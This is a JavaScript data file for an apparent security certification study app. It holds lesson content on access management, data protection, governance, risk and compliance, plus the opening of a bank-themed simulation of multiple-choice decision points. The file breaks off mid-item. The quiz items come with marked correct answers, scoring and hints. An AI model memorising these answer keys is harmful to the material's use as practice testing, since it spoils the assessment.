            content: "**PAM Concepts:**\n- Just-in-time access: Elevate only when needed\n- Privileged session management: Monitor admin sessions\n- Password vaulting: Secure credential storage\n- Least privilege: Minimum access needed\n\n**Account Types:**\n- User accounts: Regular users\n- Service accounts: Application-to-application\n- Privileged accounts: Admin access\n- Shared accounts: Avoid—no accountability",
            key_points: [
              "JIT provides temporary elevated access",
              "PAM monitors privileged sessions",
              "Avoid shared accounts",
              "Service accounts need special attention"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "RBAC is enterprise standard for access control",
            "PAM manages and monitors privileged access",
            "JIT provides temporary elevation",
            "Avoid shared accounts (no accountability)"
          ],
          exam_essentials: [
            "DAC = owner; MAC = labels; RBAC = roles",
            "ABAC = attribute-based policies",
            "JIT = just-in-time access elevation",
            "PAM = privileged access management"
          ]
        }
      },
      {
        id: 'D4-LESSON-006',
        domain: 4,
        title: 'Data Protection Operations',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Operational data protection implements classification, DLP, and privacy controls in day-to-day operations.",
          learning_goals: [
            "Implement data classification operationally",
            "Deploy and tune DLP",
            "Manage data privacy requirements",
            "Handle data incidents"
          ]
        },
        sections: [
          {
            title: "Operational Data Protection",
            content: "**DLP Operations:**\n- Policy tuning to reduce false positives\n- Exception handling for legitimate business\n- Incident investigation workflows\n- Integration with SIEM\n\n**Privacy Operations:**\n- Data subject requests (DSAR)\n- Consent management\n- Breach notification timelines\n- Data retention enforcement\n\n**GDPR Breach Notification:**\n72 hours to notify regulator.",
            key_points: [
              "DLP needs tuning to be effective",
              "Balance security with business needs",
              "GDPR = 72 hour breach notification",
              "Document all data handling"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "DLP requires ongoing tuning",
            "Privacy operations handle data subject requests",
            "GDPR = 72 hour notification requirement",
            "Balance security with business operations"
          ],
          exam_essentials: [
            "GDPR breach notification = 72 hours",
            "DLP needs tuning for accuracy",
            "DSAR = Data Subject Access Request",
            "Consent management is operational"
          ]
        }
      },
      {
        id: 'D4-LESSON-007',
        domain: 4,
        title: 'Security Automation',
        difficulty: 'intermediate',
        duration: '45 min',
        introduction: {
          hook: "Security automation handles repetitive tasks at machine speed. SOAR, playbooks, and API integration enable scalable security operations.",
          learning_goals: [
            "Implement SOAR platforms",
            "Develop security playbooks",
            "Automate routine tasks",
            "Integrate security tools via APIs"
          ]
        },
        sections: [
          {
            title: "Security Automation",
            content: "**SOAR (Security Orchestration, Automation, Response):**\n- Automates incident response workflows\n- Integrates multiple security tools\n- Executes playbooks automatically\n- Reduces response time\n\n**Playbooks:**\n- Documented response procedures\n- Can be manual or automated\n- Ensure consistent response\n- Continuously improved\n\n**Benefits:**\n- Faster response time\n- Consistent execution\n- Reduced human error\n- Analyst time for complex tasks",
            key_points: [
              "SOAR automates IR workflows",
              "Playbooks ensure consistency",
              "API integration connects tools",
              "Automation reduces response time"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "SOAR automates and orchestrates response",
            "Playbooks provide consistent procedures",
            "Automation frees analysts for complex work",
            "API integration enables tool connectivity"
          ],
          exam_essentials: [
            "SOAR = orchestration + automation + response",
            "Playbooks = documented response procedures",
            "Automation reduces MTTR",
            "APIs enable tool integration"
          ]
        }
      },
      // ═════════════════════════════════════════════════════════════
      // DOMAIN 5: Security Program Management
      // ═════════════════════════════════════════════════════════════
      {
        id: 'D5-LESSON-001',
        domain: 5,
        title: 'Security Governance',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Target had security tools that detected the breach. Governance failures meant alerts weren't escalated. Security governance ensures security actually happens.",
          learning_goals: [
            "Understand governance structures",
            "Develop security policies and standards",
            "Establish roles and accountability",
            "Measure program effectiveness"
          ]
        },
        sections: [
          {
            title: "Governance Framework",
            content: "**Policy Hierarchy:**\n- Policy: High-level, what and why (management approved)\n- Standard: Specific requirements, what exactly\n- Procedure: Step-by-step how\n- Guideline: Recommendations, optional\n\n**Governance Structure:**\n- Board/Executive oversight\n- Security steering committee\n- CISO/Security leadership\n- Security team\n\n**Key Policies:**\n- Acceptable Use Policy (AUP)\n- Information Security Policy\n- Incident Response Policy\n- Access Control Policy",
            key_points: [
              "Policy = what/why; Procedure = how",
              "Guidelines are optional recommendations",
              "Board provides ultimate oversight",
              "CISO leads security program"
            ],
            knowledge_check: {
              question: "What document provides step-by-step instructions for a specific task?",
              options: [
                "Policy",
                "Standard",
                "Procedure",
                "Guideline"
              ],
              correct: 2,
              explanation: "Procedure provides step-by-step how-to instructions. Policy = what/why, Standard = what exactly, Guideline = optional recommendations."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Policy hierarchy: Policy → Standard → Procedure → Guideline",
            "Policies are mandatory; Guidelines are optional",
            "Governance ensures accountability",
            "Executive oversight is essential"
          ],
          exam_essentials: [
            "Policy = what/why (mandatory)",
            "Standard = specific requirements",
            "Procedure = step-by-step how",
            "Guideline = optional recommendations"
          ]
        }
      },
      {
        id: 'D5-LESSON-002',
        domain: 5,
        title: 'Risk Management',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "Risk management helps organizations make informed decisions about where to invest security resources. Not all risks require the same treatment.",
          learning_goals: [
            "Conduct risk assessments",
            "Apply risk treatment options",
            "Understand qualitative vs quantitative",
            "Implement risk frameworks"
          ]
        },
        sections: [
          {
            title: "Risk Assessment",
            content: "**Risk Components:**\n- Threat: Potential cause of incident\n- Vulnerability: Weakness that can be exploited\n- Impact: Consequence if exploited\n- Likelihood: Probability of occurrence\n\n**Risk Calculation:**\nRisk = Threat × Vulnerability × Impact\nor\nRisk = Likelihood × Impact\n\n**Assessment Types:**\n- Qualitative: High/Medium/Low ratings\n- Quantitative: Dollar values\n  - SLE (Single Loss Expectancy) = Asset Value × Exposure Factor\n  - ALE (Annual Loss Expectancy) = SLE × ARO",
            key_points: [
              "Risk = Likelihood × Impact",
              "Qualitative uses ratings (H/M/L)",
              "Quantitative uses dollar values",
              "ALE = SLE × ARO"
            ],
            knowledge_check: {
              question: "A server worth $50,000 has 25% exposure factor and 2 incidents expected annually. What is ALE?",
              options: [
                "$12,500",
                "$25,000",
                "$50,000",
                "$100,000"
              ],
              correct: 1,
              explanation: "SLE = $50,000 × 0.25 = $12,500. ALE = $12,500 × 2 = $25,000."
            }
          },
          {
            title: "Risk Treatment",
            content: "**Risk Treatment Options:**\n- Avoid: Eliminate the activity causing risk\n- Transfer: Insurance or third party\n- Mitigate: Implement controls to reduce\n- Accept: Document and accept residual risk\n\n**Risk Appetite:**\nAmount of risk organization will accept to achieve objectives.\n\n**Residual Risk:**\nRisk remaining after controls implemented.",
            key_points: [
              "Four treatments: Avoid, Transfer, Mitigate, Accept",
              "Risk appetite guides decisions",
              "Residual risk always remains",
              "Document accepted risks"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Risk = Likelihood × Impact",
            "Treatment: Avoid, Transfer, Mitigate, Accept",
            "ALE = SLE × ARO for quantitative",
            "Residual risk remains after controls"
          ],
          exam_essentials: [
            "SLE = AV × EF; ALE = SLE × ARO",
            "Risk treatments: Avoid, Transfer, Mitigate, Accept",
            "Qualitative = H/M/L; Quantitative = $$$",
            "Risk appetite = acceptable risk level"
          ]
        }
      },
      {
        id: 'D5-LESSON-003',
        domain: 5,
        title: 'Third-Party Risk Management',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "SolarWinds breach affected 18,000 customers through a compromised software update. Your security is only as strong as your weakest vendor.",
          learning_goals: [
            "Implement third-party risk programs",
            "Conduct vendor assessments",
            "Manage supply chain security",
            "Establish contractual requirements"
          ]
        },
        sections: [
          {
            title: "Vendor Risk Management",
            content: "**Assessment Process:**\n1. Vendor identification and tiering\n2. Security questionnaires\n3. Documentation review (SOC 2, ISO 27001)\n4. Right to audit clauses\n5. Ongoing monitoring\n6. Termination procedures\n\n**Risk Tiering:**\n- Tier 1 (Critical): Full assessment, ongoing monitoring\n- Tier 2 (High): Detailed assessment\n- Tier 3 (Medium): Standard questionnaire\n- Tier 4 (Low): Minimal assessment\n\n**Key Documents:**\n- SOC 2 Type II: Controls operating over time\n- ISO 27001: Security management certification\n- Penetration test reports",
            key_points: [
              "Tier vendors by risk level",
              "SOC 2 Type II shows operational controls",
              "Right to audit enables verification",
              "Ongoing monitoring is essential"
            ],
            knowledge_check: {
              question: "Which report demonstrates controls were operating effectively over a period of time?",
              options: [
                "SOC 1 Type I",
                "SOC 2 Type I",
                "SOC 2 Type II",
                "ISO 27001"
              ],
              correct: 2,
              explanation: "SOC 2 Type II evaluates control operation over time (typically 6-12 months). Type I is point-in-time only."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Tier vendors by risk level",
            "SOC 2 Type II = controls over time",
            "Right to audit enables verification",
            "Supply chain attacks target vendors"
          ],
          exam_essentials: [
            "SOC 2 Type I = point-in-time",
            "SOC 2 Type II = period of time",
            "Right to audit = verification rights",
            "SBOM = Software Bill of Materials"
          ]
        }
      },
      {
        id: 'D5-LESSON-004',
        domain: 5,
        title: 'Security Compliance',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Compliance requirements drive security investments. Understanding frameworks helps align security programs with business requirements.",
          learning_goals: [
            "Understand compliance requirements",
            "Implement security frameworks",
            "Manage audit preparation",
            "Maintain compliance documentation"
          ]
        },
        sections: [
          {
            title: "Compliance Frameworks",
            content: "**Regulatory Requirements:**\n- PCI DSS: Payment card data\n- HIPAA: Healthcare information\n- SOX: Financial reporting\n- GDPR: EU personal data\n- GLBA: Financial institutions\n\n**Security Frameworks:**\n- NIST CSF: Identify, Protect, Detect, Respond, Recover\n- ISO 27001: Information security management\n- CIS Controls: Prioritized security controls\n- COBIT: IT governance",
            key_points: [
              "Regulations have legal penalties",
              "Frameworks provide best practices",
              "PCI DSS for payment data",
              "HIPAA for healthcare"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Regulations = legal requirements with penalties",
            "Frameworks = best practices guidance",
            "NIST CSF: Identify, Protect, Detect, Respond, Recover",
            "Compliance requires ongoing effort"
          ],
          exam_essentials: [
            "PCI DSS = payment cards",
            "HIPAA = healthcare",
            "GDPR = EU personal data",
            "NIST CSF = 5 functions"
          ]
        }
      },
      {
        id: 'D5-LESSON-005',
        domain: 5,
        title: 'Audits & Assessments',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Audits verify that security controls are implemented and operating effectively. Assessment types serve different purposes.",
          learning_goals: [
            "Understand audit types",
            "Prepare for security audits",
            "Manage audit findings",
            "Implement continuous assessment"
          ]
        },
        sections: [
          {
            title: "Audit Types",
            content: "**Internal Audit:**\n- Performed by internal team\n- Identifies gaps before external audit\n- Continuous improvement focus\n\n**External Audit:**\n- Independent third party\n- Required for certifications\n- More rigorous and objective\n\n**Regulatory Audit:**\n- By regulators (PCI QSA, HIPAA)\n- Compliance verification\n- Can result in penalties\n\n**Self-Assessment:**\n- Organization evaluates itself\n- Less rigorous\n- Good for initial gap analysis",
            key_points: [
              "Internal = improvement focused",
              "External = certification/compliance",
              "Regulatory = legal requirement",
              "Self-assessment = gap identification"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Internal audits prepare for external",
            "External audits provide certification",
            "Regulatory audits have legal impact",
            "Continuous assessment improves security"
          ],
          exam_essentials: [
            "Internal = self-improvement",
            "External = independent verification",
            "Regulatory = compliance required",
            "QSA = Qualified Security Assessor (PCI)"
          ]
        }
      },
      {
        id: 'D5-LESSON-006',
        domain: 5,
        title: 'Security Awareness',
        difficulty: 'intermediate',
        duration: '45 min',
        introduction: {
          hook: "Users are both the greatest vulnerability and the first line of defense. Security awareness transforms users from risks to security partners.",
          learning_goals: [
            "Design awareness programs",
            "Implement phishing simulations",
            "Measure program effectiveness",
            "Build security culture"
          ]
        },
        sections: [
          {
            title: "Awareness Program Design",
            content: "**Training Components:**\n- New hire onboarding\n- Annual refresher training\n- Role-based training\n- Phishing simulations\n- Security newsletters/communications\n\n**Key Topics:**\n- Phishing recognition\n- Password security\n- Social engineering\n- Data handling\n- Physical security\n- Incident reporting\n\n**Effectiveness Metrics:**\n- Phishing click rates\n- Report rates\n- Training completion\n- Incident frequency",
            key_points: [
              "Training must be ongoing, not one-time",
              "Phishing simulations measure awareness",
              "Role-based training for specific risks",
              "Measure and improve continuously"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Awareness training is continuous process",
            "Phishing simulations test effectiveness",
            "Metrics drive improvement",
            "Culture change takes time"
          ],
          exam_essentials: [
            "Annual training minimum",
            "Phishing simulation = awareness testing",
            "Click rate measures awareness",
            "No punishment for reporting"
          ]
        }
      }
    ];
    // END OF LESSON_DATA

// ═══════════════════════════════════════════════════════════════
// SIMULATION DATA (40 simulations with 355 decision points)
// ═══════════════════════════════════════════════════════════════
const SIMULATION_DATA = [
  {
    "id": "D1-REM-001",
    "title": "Policy Fundamentals Deep Dive",
    "domain": 1,
    "type": "REM",
    "difficulty": "beginner",
    "time_estimate": "30-40 minutes",
    "role": "grc_analyst",
    "organization": {
      "name": "Coastal Community Bank",
      "industry": "Financial Services - Community Banking",
      "size": "280 employees, 12 branches, $2.1B in assets"
    },
    "introduction": "Welcome to Policy Fundamentals Deep Dive. You will make critical security decisions.",
    "learning_objectives": [
      "1.1",
      "1.3"
    ],
    "decision_points": [
      {
        "id": "D1R1-DP-001",
        "sequence": 1,
        "title": "Policy vs Standard vs Procedure",
        "situation": "Your manager hands you a document and asks you to identify what type it is. The document reads: 'Step 1: Log into the admin console at https://admin.coastalbank.com. Step 2: Navigate to User Management. Step 3: Select the user account. Step 4: Click 'Disable Account' and confirm.'\n\n**Question:** What type of security document is this?",
        "options": [
          {
            "id": "A",
            "text": "Policy - it's an official document about security",
            "feedback": "Not quite. Policies are high-level statements of intent (what and why), not step-by-step instructions. This document tells HOW to do something, not WHAT should be done or WHY.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Standard - it defines specific requirements",
            "feedback": "Close, but standards define WHAT must be done (specific requirements), not HOW to do it. A standard might say 'Terminated user accounts must be disabled within 24 hours.' This document shows the steps to achieve that.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Procedure - it provides step-by-step operational instructions",
            "feedback": "Correct! Procedures provide detailed, step-by-step instructions for HOW to accomplish tasks. They're operational documents that staff follow to implement standards. The numbered steps and specific UI navigation clearly identify this as a procedure.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Guideline - it's optional best practice advice",
            "feedback": "Guidelines are optional recommendations. This document appears to be mandatory operational instructions (disabling accounts is a required action, not optional). The prescriptive 'Step 1, Step 2' format indicates a required procedure.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Look at the format - numbered steps telling you exactly what to click. What document type provides 'how-to' instructions?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Policy = What/Why, Standard = What specifically, Procedure = How (step-by-step), Guideline = Suggestions",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R1-DP-002",
        "sequence": 2,
        "title": "Control Function Classification",
        "situation": "You're reviewing controls and need to classify them by function. Your manager shows you this control: 'Security awareness training is provided to all employees annually covering phishing recognition, password security, and data handling.'\n\n**Question:** What is the PRIMARY function of this control?",
        "options": [
          {
            "id": "A",
            "text": "Detective - it helps identify security incidents",
            "feedback": "Detective controls identify incidents after or as they occur (like IDS, log monitoring, audit trails). Training happens before incidents - it's designed to stop employees from falling for attacks in the first place.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Preventive - it stops incidents before they happen",
            "feedback": "Correct! Security awareness training is preventive - it equips employees to recognize and avoid threats like phishing, preventing incidents from occurring. Trained employees don't click malicious links in the first place.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Corrective - it fixes issues after they're found",
            "feedback": "Corrective controls fix problems after detection (like patch management, backup restoration). Training is proactive - it happens before incidents, not in response to them.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Compensating - it's an alternative when other controls fail",
            "feedback": "Compensating controls substitute for primary controls that aren't feasible. Training is a primary control in its own right, not a workaround. Every organization should have security awareness training as a baseline.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Think about WHEN this control operates. Before incidents? During? After?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Preventive = stops threats before they succeed. A trained employee doesn't click phishing links.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R1-DP-003",
        "sequence": 3,
        "title": "Control Type Classification",
        "situation": "Now classify the same training control by implementation type (how it's implemented).\n\n**Question:** What TYPE of control is security awareness training?",
        "options": [
          {
            "id": "A",
            "text": "Technical - it uses technology",
            "feedback": "While training might be delivered via technology (LMS, videos), the control itself operates through people - it changes human behavior. Technical controls operate through technology systems (firewalls, encryption). Training is about educating people.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Administrative - it operates through people and processes",
            "feedback": "Correct! Training is an administrative (managerial) control - it operates by influencing human behavior through education and awareness. Administrative controls include policies, procedures, training, background checks, and access reviews - all people-and-process focused.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Physical - it protects physical assets",
            "feedback": "Physical controls protect tangible assets and spaces - locks, fences, guards, badges. Training protects through education, not physical barriers.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Hybrid - it combines multiple types",
            "feedback": "While some controls are hybrid, training is squarely administrative. It's human-focused and process-based. The goal is changing employee behavior through education - a people-centric approach.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Technical = technology. Administrative = people/process. Physical = tangible. What does training target?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Training changes human behavior through education - that's administrative (people-focused), not technical.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R1-DP-004",
        "sequence": 4,
        "title": "Complete Control Classification",
        "situation": "Your manager asks you to fully classify this control: 'Motion-activated cameras record all access to the server room, with footage reviewed daily by security staff.'\n\n**Question:** How should this control be classified by FUNCTION and TYPE?",
        "options": [
          {
            "id": "A",
            "text": "Preventive + Physical - cameras prevent unauthorized access to physical spaces",
            "feedback": "Cameras don't prevent access - they record it. Someone can still walk into the server room; the camera captures footage. The prevention aspect (if any) is psychological deterrence, not physical prevention. Locks prevent; cameras detect.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Detective + Physical - cameras detect unauthorized access through physical monitoring",
            "feedback": "Excellent! Function: Detective - the camera records events for later review, detecting unauthorized access. Type: Physical - it's a tangible device protecting physical space. The daily review is the detective activity identifying incidents.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Deterrent + Technical - cameras use technology to discourage threats",
            "feedback": "Cameras can have deterrent effect, but the scenario describes recording and daily review - that's detection, not deterrence. Also, while cameras use technology, they're categorized as physical controls because they protect physical spaces.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Corrective + Administrative - footage helps correct security issues",
            "feedback": "Corrective controls fix problems after detection. Cameras detect - they don't fix anything. Also, cameras are physical devices, not administrative (people/process) controls. The review process is administrative, but the camera itself is physical.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "What does the camera DO? Record for review = detection. What IS the camera? Physical device.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Detective controls identify incidents (recording + review). Physical controls are tangible (cameras, locks).",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R1-DP-005",
        "sequence": 5,
        "title": "Defense in Depth Application",
        "situation": "You're reviewing the bank's data center security and need to recommend controls for defense in depth. Currently, badge readers control data center entry.\n\n**Question:** Which combination BEST implements defense in depth for data center access?",
        "options": [
          {
            "id": "A",
            "text": "Add a second badge reader for redundancy",
            "feedback": "A second badge reader is just redundancy of the same control, not defense in depth. If badges are compromised or shared, two readers don't help. Defense in depth requires different types of controls that address different attack vectors.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Badge reader + security camera + visitor log + security awareness training",
            "feedback": "Excellent defense in depth! Multiple control types: Physical (badge, camera), Administrative (visitor log, training), Multiple functions: Preventive (badge), Detective (camera, log), Preventive (training). Each layer addresses different threats and failure modes.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Replace badge with biometric only - it's more secure",
            "feedback": "Biometrics may be stronger than badges, but replacing one control with another isn't defense in depth. Defense in depth layers multiple controls. Also, biometrics have their own weaknesses - what if the reader fails?",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Add three more badge readers at different entrance points",
            "feedback": "More entry points with the same control type doesn't create defense in depth. If badges can be stolen or cloned, having them at multiple doors doesn't help. You need different control types, not more of the same.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Defense in depth = multiple layers of different control types. Same control repeated isn't layered.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Effective layering: different types (technical, administrative, physical) AND different functions (prevent, detect).",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R1-DP-006",
        "sequence": 6,
        "title": "Policy Writing",
        "situation": "You're drafting an information classification policy. Your first attempt reads: 'All employees should try to label documents appropriately when they remember to do so.'\n\n**Question:** What's wrong with this policy statement?",
        "options": [
          {
            "id": "A",
            "text": "It's too short - policies need to be longer and more detailed",
            "feedback": "Length isn't the issue. Policies can be concise if they're clear and authoritative. The problem is the language - 'should try' and 'when they remember' make it optional and vague.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "It uses weak, non-mandatory language ('should try', 'when they remember') making compliance optional",
            "feedback": "Exactly right. Policy language must be mandatory and unambiguous. 'Should try' and 'when they remember' create loopholes. Better: 'All employees MUST classify and label documents at the time of creation according to the Data Classification Standard.'",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "It mentions employees - policies should only address systems, not people",
            "feedback": "Policies absolutely should address people - employee responsibilities are core to security policy. Administrative controls are people-focused. The issue is the weak language, not mentioning employees.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "It's perfect - policies should be flexible and not too demanding",
            "feedback": "Policies establish requirements - they need to be clear about what's mandatory. 'Flexible' policy language leads to inconsistent compliance. When something is required (like classification), the policy must say so clearly.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "What happens if an employee reads 'should try' and decides not to try? Is that a violation?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Policy language: 'must', 'shall', 'will' = mandatory. 'Should', 'may', 'try' = optional. Requirements need mandatory language.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R1-DP-007",
        "sequence": 7,
        "title": "Standard Development",
        "situation": "The classification policy you wrote says: 'All data must be classified according to sensitivity.' Now you need to write a standard that supports this policy.\n\n**Question:** Which is the BEST example of a supporting standard?",
        "options": [
          {
            "id": "A",
            "text": "'Employees should use good judgment when classifying data.'",
            "feedback": "'Good judgment' is vague and unenforceable - what does it mean? Standards must be specific and measurable. An auditor can't assess compliance with 'good judgment.' Standards define concrete requirements.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "'Data shall be classified as Public, Internal, Confidential, or Restricted based on sensitivity and regulatory requirements.'",
            "feedback": "This is a proper standard - it specifies the exact classification levels required. It's measurable (is data labeled as one of these four?), enforceable, and supports the policy's intent. Standards translate policy into specific requirements.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "'Step 1: Open the document. Step 2: Click File > Properties. Step 3: Select classification level.'",
            "feedback": "This is a procedure, not a standard. It tells HOW to apply classification, not WHAT the classification requirements are. Standards define the requirements; procedures show how to implement them.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "'Data classification is important for protecting sensitive information.'",
            "feedback": "This is just a statement about importance - it doesn't set any requirements. Standards must specify WHAT is required, not just why something matters. There's no compliance criteria here.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Standards answer 'What specifically is required?' They should be concrete and auditable.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Good standards have specific criteria that can be measured: Are there exactly four classification levels? Yes/No = auditable.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R1-DP-008",
        "sequence": 8,
        "title": "Framework Alignment",
        "situation": "The examiner asks how your policies align with regulatory requirements. You need to demonstrate framework mapping.\n\n**Question:** What is the PRIMARY purpose of mapping controls to frameworks like GLBA or PCI DSS?",
        "options": [
          {
            "id": "A",
            "text": "To have impressive documentation that looks professional",
            "feedback": "Framework mapping isn't about appearances - it's about demonstrating compliance and ensuring coverage. Mappings must be accurate and substantive, not just impressive-looking.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "To demonstrate compliance with regulatory requirements and ensure complete coverage",
            "feedback": "Exactly right. Framework mapping serves two purposes: demonstrating to regulators/auditors that requirements are met, and internally ensuring no requirements are missed. It's a completeness check and compliance evidence.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "To replace the need for actual security controls with documentation",
            "feedback": "Documentation never replaces implementation. Mapping shows WHERE controls meet requirements; you still need actual working controls. Auditors verify implementation, not just documentation.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "To satisfy one framework and automatically comply with all others",
            "feedback": "Frameworks overlap but aren't identical. GLBA and PCI DSS have different requirements. Mapping helps identify where controls satisfy multiple frameworks, but you must verify each framework's specific requirements.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Why do auditors ask for framework mappings? What are they trying to verify?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Mapping demonstrates compliance coverage - which controls satisfy which requirements. It's evidence AND completeness validation.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R1-DP-009",
        "sequence": 9,
        "title": "Compensating Controls",
        "situation": "The legacy teller system cannot support MFA due to technical limitations. The vendor has no timeline for adding MFA support. An examiner asks how you're addressing this gap.\n\n**Question:** What is the CORRECT approach to address this control gap?",
        "options": [
          {
            "id": "A",
            "text": "Accept the risk - some systems just can't meet modern requirements",
            "feedback": "For a required control like MFA (especially for financial systems), simply accepting risk isn't sufficient. You need compensating controls that provide equivalent protection. Risk acceptance should be last resort after compensating controls.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement compensating controls: restrict system to internal network, require strong passwords, implement session monitoring, and document risk acceptance with timeline for system replacement",
            "feedback": "Excellent. Compensating controls provide alternative protection when the primary control isn't feasible: network restriction limits exposure, strong passwords partially compensate, monitoring detects misuse, and documented risk acceptance with remediation timeline shows governance. This is proper compensating control implementation.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Claim MFA is implemented because users have to enter a username AND password (two factors)",
            "feedback": "Username and password are both 'something you know' - that's single-factor authentication, not MFA. Multi-factor requires different factor types: something you know + something you have/are. This misrepresentation would likely result in audit findings.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Disable the legacy system until MFA can be implemented",
            "feedback": "This might be appropriate in extreme cases, but disabling a critical teller system stops bank operations. Compensating controls allow continued operation while managing risk. The goal is security AND business continuity.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Compensating controls provide alternative protection when the primary control isn't feasible. What could reduce MFA's absence risk?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Compensating controls should: reduce the same risk, be documented with rationale, include timeline for proper remediation when possible.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R1-DP-010",
        "sequence": 10,
        "title": "Policy Review and Maintenance",
        "situation": "Your manager asks you to establish a policy maintenance schedule. The bank's current policies haven't been reviewed since they were written.\n\n**Question:** What is the appropriate policy review and maintenance approach?",
        "options": [
          {
            "id": "A",
            "text": "Review policies only when auditors require it",
            "feedback": "Reactive review leaves policies stale and potentially non-compliant between audits. Threats, regulations, and business needs change constantly. Policies should be proactively maintained, not just auditor-driven.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
